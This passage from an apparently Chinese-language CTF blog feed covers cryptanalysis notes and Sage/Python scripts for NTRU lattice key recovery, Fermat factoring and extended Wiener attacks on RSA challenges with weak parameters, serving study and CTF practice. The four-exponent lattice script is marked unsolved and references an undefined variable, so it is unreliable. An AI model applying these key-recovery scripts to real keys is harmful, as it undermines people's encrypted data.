class="number">23969137365202547728693945383611572667294904799854243194734466236017441545927679469239814785947383727854265554138290421827510545078908517696536495567625593439996528098119344504866817224169113920532528233185011693829122447604993468817512696036673804626830507903206709121383065701222707251053362179946170981868061834734684494881504724254812067180384269711822738708203454131838741703416329765575995359232573740932069147491776326045743679105041246906081872936901848272288949389026129761726749334006319072981386763830897454245553866145620689939497868469730297795063648030738668273210516497399954626983672357236110363894081</span></span><br><span class="line">c = <span class="number">6388077150013017095358415295704360631706672647932184267739118115740221804173068089559645506533240372483689997499821300861865955720630884024099415936433339512125910973936154713306915269365877588850574948033131161679256849814325373882706559635563285860782658950169507940368219930971600522754831612134153314448445006958300840618894359885321144158064446236744722180819829183828290798747455324761671198097712539900569386477647697973195787663298318786718012522378981137877863153067057280649127202971806609339007027052518049995341356359016898069863799529357397514218249272201695539181908803360181347114492616706419618151757</span></span><br><span class="line"></span><br><span class="line">M = Matrix([[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line"></span><br><span class="line">fg = M.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = fg[<span class="number">0</span>], fg[<span class="number">1</span>]</span><br><span class="line">m = (c * f % p) * invert(f, g) % g</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>除了<code>LLL</code>算法外还有高斯发现的在2维格中的求解算法<code>GaussLatticeReduction</code>，有点像欧几里德算法，可以参考师傅博客</p>
<h1 id="ATTACK"><a href="#ATTACK" class="headerlink" title="ATTACK"></a>ATTACK</h1><p>当然，像这道题构造一个简单的整数格就可以求出，如果是在多项式下，简单题的话也是直接构造一个矩阵</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102152856729.png" alt="image-20211102152856729"></p>
<p>其中$H$是根据公钥多项式的系数生成的循环矩阵</p>
<p>构建一个这样的矩阵，然后进行LLL算法得到解密密钥，这里偷一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage </span></span><br><span class="line"><span class="comment">#多项式</span></span><br><span class="line">N =</span><br><span class="line">p =</span><br><span class="line">q =</span><br><span class="line">Q.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">P.&lt;y&gt; = Zmod(p)[]</span><br><span class="line"></span><br><span class="line">ex = </span><br><span class="line">hx = </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-------decrypt------&#x27;</span>)</span><br><span class="line">qq = x^N-<span class="number">1</span></span><br><span class="line">pp = y^N-<span class="number">1</span></span><br><span class="line">hn = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> hx.coefficients()]</span><br><span class="line">n = <span class="built_in">len</span>(hn)</span><br><span class="line">A1 = matrix.identity(n)</span><br><span class="line">A0 = matrix.zero(n)</span><br><span class="line">Aq = matrix.identity(n) * q</span><br><span class="line">Ah = matrix(ZZ, [hn[-i:] + hn[:-i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line">M = block_matrix([A1,Ah,A0,Aq],nrows=<span class="number">2</span>)</span><br><span class="line">L = M.LLL()</span><br><span class="line">v = L[<span class="number">0</span>]</span><br><span class="line">f = <span class="built_in">list</span>(v)[:n]</span><br><span class="line">g = <span class="built_in">list</span>(v)[n:]</span><br><span class="line">fx = Q(f)</span><br><span class="line">fy = P(f)</span><br><span class="line">gx = Q(g)</span><br><span class="line">Fqx = fx.inverse_mod(qq)</span><br><span class="line">Fpy = fy.inverse_mod(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hxx = (Fqx*gx).mod(x^N-1)</span></span><br><span class="line"><span class="comment">#print(hxx==hx)</span></span><br><span class="line"></span><br><span class="line">ax = (fx*ex).mod(qq)</span><br><span class="line">an = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ax.coefficients()]</span><br><span class="line"><span class="comment">#中心提升(centerlift)，使域范围从[0,q)变换到(-q/2,q/2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(an)):</span><br><span class="line">	<span class="keyword">if</span> an[i] &gt; q//<span class="number">2</span>:</span><br><span class="line">		an[i] -= q</span><br><span class="line">ax = P(an)</span><br><span class="line"><span class="built_in">print</span>(ax)</span><br><span class="line">out = (Fpy * ax).mod(pp)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out.coefficients()))</span><br></pre></td></tr></table></figure>

<p>等遇到别的题目再说吧，省赛的NTRU什么狗八</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>格密码</tag>
        <tag>NTRU</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA</title>
    <url>/posts/345c5d/</url>
    <content><![CDATA[<p>the curtain call is for a better unveiling</p>
<p>参考</p>
<p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">https://lazzzaro.github.io/2020/05/06/crypto-RSA/</a></p>
<p><a href="http://coinc1dens.me/2019/11/01/RSA-1.html">http://coinc1dens.me/2019/11/01/RSA-1.html</a></p>
<p><a href="https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">https://jayxv.github.io/2020/05/20/sage常用命令/</a></p>
<span id="more"></span>

<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><p>关于RSA就是大整数分解了</p>
<h3 id="0x1-分解大数"><a href="#0x1-分解大数" class="headerlink" title="0x1 分解大数"></a>0x1 分解大数</h3><ul>
<li><p><strong>factordb：</strong> 在线网站，记录被分解过的数，Fr.<a href="http://www.factordb.com/">http://www.factordb.com/</a></p>
</li>
<li><p><strong>yafu：</strong> 可执行文件，内涵费马分解等算法，适用当$p$和$q$相差很小或很大，（相差很大我没理解</p>
<p>Fr.<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p>
</li>
<li><p><strong>primefac：</strong> python工具，分解光滑数：加一或减一可以被很好分解的数</p>
<p>偶尔也会遇到，比如题目给的一些来历不明的数据（<a href="https://4xwi11.github.io/posts/a2deb6fa/#%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%971%EF%BC%88recuring%EF%BC%89">2021浙江省赛可信计算1</a>，<a href="null">2020羊城杯Power</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python -m primefac -vs -m=p-1 [n]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python -m primefac -vs -m=p+1 [n]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>alpertron：</strong> 在线网站，采用ECM和SIQS分解算法（不会了try一try懂？</p>
<p>Fr.<a href="https://www.alpertron.com.ar/ECM.HTM">https://www.alpertron.com.ar/ECM.HTM</a></p>
</li>
</ul>
<p><a href="null">yehuhuoquhuibuchong</a></p>
<hr>
<h3 id="0xF-补充"><a href="#0xF-补充" class="headerlink" title="0xF 补充"></a>0xF 补充</h3><p>关于费马分解在<a href="https://4xwi11.github.io/posts/eabdfebd/?highlight=%E8%B4%B9%E9%A9%AC%E5%88%86%E8%A7%A3#Crypto-%E5%88%87%E8%AE%B0%E5%8A%A1%E5%BF%85%E4%B8%80%E5%AE%9A%E8%A6%81%E7%AE%80%E5%8D%95%EF%BC%88recuring%EF%BC%89">一次比赛</a>中看原理实现过，就$p$和$q$的相差这块，效果比yafu强一丢丢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = </span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([p * q - N, p - q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">abs</span>(ans[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">abs</span>(ans[<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(p, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="0x01-PEM"><a href="#0x01-PEM" class="headerlink" title="0x01 PEM"></a>0x01 PEM</h2><ul>
<li><p>特征：提供<code>.pem</code>文件，或者形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCkEdgBoR3VGqxIKXu/LxC5AQzc</span><br><span class="line">+30Rlv19GtGI+23gRZE+Lrkqzkm57eriDuaUO9NNZMWlBQfyS1S29F91Cn5LGYcQ</span><br><span class="line">O7XjM//EFlY1okJBHbbUOmsMHMidqb72K48e+WvvtZemFaO7mJz+K6fteQQso1yf</span><br><span class="line">DGlb6b5LTs4B3DTIGwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></li>
</ul>
<p>可以使用在线工具<a href="https://www.ssleye.com/ssltool/priv_get.html">https://www.ssleye.com/ssltool/priv_get.html</a></p>
<p>也可以openssl或者python，Fr.<a href="https://4xwi11.github.io/posts/d77a51b9/">https://4xwi11.github.io/posts/d77a51b9/</a></p>
<h2 id="0x02-CTF-RSA常考攻击"><a href="#0x02-CTF-RSA常考攻击" class="headerlink" title="0x02 CTF-RSA常考攻击"></a>0x02 CTF-RSA常考攻击</h2><h3 id="0x10001-Rabin-Attack"><a href="#0x10001-Rabin-Attack" class="headerlink" title="0x10001 Rabin Attack"></a>0x10001 Rabin Attack</h3><ul>
<li>特征：e=2</li>
</ul>
<p>暂时请看</p>
<p><a href="https://4xwi11.github.io/posts/ba78595a/">https://4xwi11.github.io/posts/ba78595a/</a></p>
<h3 id="0x10002-dp-leak-Attack"><a href="#0x10002-dp-leak-Attack" class="headerlink" title="0x10002 dp leak Attack"></a>0x10002 dp leak Attack</h3><ul>
<li>特征：已知$dp\equiv d\ (mod\ p-1)$</li>
</ul>
<p>泄漏关于d的这也是一个大类，暂时请看</p>
<p><a href="https://4xwi11.github.io/posts/6f8a7505/">https://4xwi11.github.io/posts/6f8a7505/</a></p>
<h3 id="0x10003-large-exponent-Attack"><a href="#0x10003-large-exponent-Attack" class="headerlink" title="0x10003 large exponent Attack"></a>0x10003 large exponent Attack</h3><p>这一切还要从e很大开始说起</p>
<ul>
<li><p>$d&lt;N^{0.25}$</p>
<p>一般的Wiener’s Attack，Fr.<a href="https://4xwi11.github.io/posts/1b1ce809/">https://4xwi11.github.io/posts/1b1ce809/</a></p>
</li>
<li><p>$d&lt;N^{0.29}$</p>
<p>boneh durfee，Fr.<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p>
</li>
<li><p>with two/three/four/five… large exponent</p>
<p>extending Wiener’s Attack，Fr.<a href="https://4xwi11.github.io/posts/1b1ce809/">https://4xwi11.github.io/posts/1b1ce809/</a></p>
</li>
</ul>
<h4 id="Lattice-of-extending-Wiener’s-Attack"><a href="#Lattice-of-extending-Wiener’s-Attack" class="headerlink" title="Lattice of extending Wiener’s Attack"></a>Lattice of extending Wiener’s Attack</h4><p>现在有的几个矩阵</p>
<ul>
<li>two exponents</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">114552459553730357961013268333698879659007919035942930313432809776799669181481660306531243618160127922304264986001501784564575128319884991774542682853466808329973362019677284072646678280051091964555611220961719302320547405880386113519147076299481594997799884384012548506240748042365643212774215730304047871679706035596550898944580314923260982768858133395187777029914150064371998328788068888440803565964567662563652062845388379897799506439389461619422933318625765603423604615137217375612091221578339493263160670355032898186792479034771118678394464854413824347305505135625135428816394053078365603937337271798774138959</span></span><br><span class="line">N = <span class="number">14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line">e2 = <span class="number">27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line">c = <span class="number">6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">5</span> / <span class="number">14</span></span><br><span class="line">M1 = <span class="built_in">int</span>(<span class="built_in">pow</span>(N, <span class="number">0.5</span>))</span><br><span class="line">M2 = <span class="built_in">int</span>(<span class="built_in">pow</span>(N, <span class="number">1</span> + a))</span><br><span class="line">L2 = matrix(ZZ, [[N, -M1 * N, <span class="number">0</span>, N ** <span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, M1 * e1, -M2 * e1, -e1 * N],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, M2 * e2, -e2 * N],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e1 * e2]])</span><br><span class="line">B = L2.LLL()[<span class="number">0</span>]</span><br><span class="line">A = B * L2 ^ (-<span class="number">1</span>)</span><br><span class="line">phi = <span class="built_in">int</span>(e1 * A[<span class="number">1</span>] // A[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(<span class="number">0x10001</span>, phi), N)))</span><br></pre></td></tr></table></figure>

<ul>
<li>three exponents</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha2 = <span class="number">815.</span>/<span class="number">2048</span></span><br><span class="line">M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line"></span><br><span class="line">L = B.LLL()</span><br><span class="line">v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">x = v * B**(-<span class="number">1</span>)</span><br><span class="line">phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line"><span class="built_in">print</span>(phi_)</span><br></pre></td></tr></table></figure>

<ul>
<li>four exponents（not solve）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha2 = <span class="number">888.</span>/<span class="number">2048</span></span><br><span class="line">M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">2</span>))</span><br><span class="line">M2 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">2</span> + alpha2))</span><br><span class="line">M4 = <span class="built_in">int</span>(gmpy2.mpz(N))</span><br><span class="line">M5 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">2</span> + alpha2))</span><br><span class="line">M6 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>+alpha2))</span><br><span class="line">M7 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>+alpha2))</span><br><span class="line">M8 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">1.</span>/<span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> M9 <span class="keyword">in</span>  [M1, M2, M3, M4, M5, M6, M7, M8]:</span><br><span class="line">    <span class="keyword">for</span> M10 <span class="keyword">in</span> [M1, M2, M3, M4, M5, M6, M7, M8]:</span><br><span class="line">        M12 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">2</span>+alpha2))</span><br><span class="line">        M12 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>+alpha2))</span><br><span class="line">        M13 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">1</span>+alpha2))</span><br><span class="line">        M14 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">1</span>+alpha2))</span><br><span class="line">        M15 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">1</span>+alpha2))</span><br><span class="line"></span><br><span class="line">        D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, M8, M9, M10, M11, M12, M13, M14, M15, <span class="number">1</span>])</span><br><span class="line">        B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>,        N**<span class="number">4</span>],</span><br><span class="line">                         [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>, -e1,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>,  -e1*N**<span class="number">2</span>,    -e1*N**<span class="number">3</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,  -e2*N**<span class="number">2</span>,         <span class="number">0</span>,    -e2*N**<span class="number">3</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N,   <span class="number">0</span>, -e1*e2,      <span class="number">0</span>,  e1*e2,         <span class="number">0</span>,   e1*e2*N,   e1*e2*N,  e1*e2*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,  -e3*N**<span class="number">2</span>,         <span class="number">0</span>,         <span class="number">0</span>,    -e3*N**<span class="number">3</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N,   <span class="number">0</span>,      <span class="number">0</span>,  e1*e3,      <span class="number">0</span>,   e1*e3*N,         <span class="number">0</span>,   e1*e3*N,  e1*e3*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N,   <span class="number">0</span>,      <span class="number">0</span>, -e2*e3, -e2*e3,   e2*e3*N,   e2*e3*N,         <span class="number">0</span>,  e2*e3*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, -e1*e2*e3, -e1*e2*e3, -e1*e2*e3, -e1*e2*e3*N],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,  e4,  -e4*N,      <span class="number">0</span>,      <span class="number">0</span>,   e4*N**<span class="number">2</span>,   e4*N**<span class="number">2</span>,   e4*N**<span class="number">2</span>,    -e4*N**<span class="number">3</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,  e1*e4, -e1*e4, -e1*e4,  -e1*e4*N,  -e1*e4*N,         <span class="number">0</span>,  e1*e4*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e4,      <span class="number">0</span>,  -e2*e4*N,         <span class="number">0</span>,  -e2*e4*N,  e2*e4*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,  e3*e4,         <span class="number">0</span>,  -e3*e4*N,  -e3*e4*N, -e1*e2*e4*N],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,  e1*e2*e4,         <span class="number">0</span>,         <span class="number">0</span>,  e3*e4*N**<span class="number">2</span>],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,  e1*e3*e4,         <span class="number">0</span>, -e1*e3*e4*N],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>,  e2*e3*e4, -e2*e3*e4*N],</span><br><span class="line">                         [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,        <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>,         <span class="number">0</span>, e1*e2*e3*e4]])*D</span><br><span class="line"></span><br><span class="line">        L = B.LLL()</span><br><span class="line">        v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">        x = v * B**(-<span class="number">1</span>)</span><br><span class="line">        phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">        <span class="built_in">print</span>(phi_)</span><br></pre></td></tr></table></figure>

<ul>
<li>five exponent（plz no）</li>
</ul>
<h3 id="0x10004-e-varphi-ne-1"><a href="#0x10004-e-varphi-ne-1" class="headerlink" title="0x10004 $(e,\varphi)\ne 1$"></a>0x10004 $(e,\varphi)\ne 1$</h3><p>Fr.<a href="http://www.zbc53.top/archives/28/">http://www.zbc53.top/archives/28/</a></p>
<h2 id="0x03-与RSA有关的密码手段"><a href="#0x03-与RSA有关的密码手段" class="headerlink" title="0x03 与RSA有关的密码手段"></a>0x03 与RSA有关的密码手段</h2><h3 id="0x11-多项式RSA"><a href="#0x11-多项式RSA" class="headerlink" title="0x11 多项式RSA"></a>0x11 多项式RSA</h3><p><a href="https://4xwi11.github.io/posts/a0a0f5aa/">https://4xwi11.github.io/posts/a0a0f5aa/</a></p>
<h3 id="0x12-格"><a href="#0x12-格" class="headerlink" title="0x12 格"></a>0x12 格</h3><p>初遇格</p>
<p><a href="https://4xwi11.github.io/posts/377b2f28/">红明谷2021 ezCRT</a></p>
<ul>
<li>extending Wiener’s Attack里的格</li>
</ul>
<h3 id="0x13-CopperSmith"><a href="#0x13-CopperSmith" class="headerlink" title="0x13 CopperSmith"></a>0x13 CopperSmith</h3><p>Fr.<a href="https://github.com/defund/coppersmith">https://github.com/defund/coppersmith</a></p>
<hr>
<h2 id="0xFF-CTFSHOW"><a href="#0xFF-CTFSHOW" class="headerlink" title="0xFF CTFSHOW"></a>0xFF CTFSHOW</h2><p>ctfshow上有一个专题里是RSA的入门，la佬出的题目</p>
<p><a href="https://4xwi11.github.io/posts/80806ae5/">https://4xwi11.github.io/posts/80806ae5/</a></p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>Rabin攻击</title>
    <url>/posts/ba78595a/</url>
    <content><![CDATA[<p>参考文档</p>
<p><a href="https://blog.csdn.net/jcbx_/article/details/101066670">https://blog.csdn.net/jcbx_/article/details/101066670</a></p>
<p><em><strong>Square roots modulo a prime</strong></em></p>
<span id="more"></span>

<h1 id="Rabin攻击和Square-roots-modulo-a-prime原理"><a href="#Rabin攻击和Square-roots-modulo-a-prime原理" class="headerlink" title="Rabin攻击和Square roots modulo a prime原理"></a>Rabin攻击和Square roots modulo a prime原理</h1><p>需要知道二次剩余，雅可比符号还有欧拉准则</p>
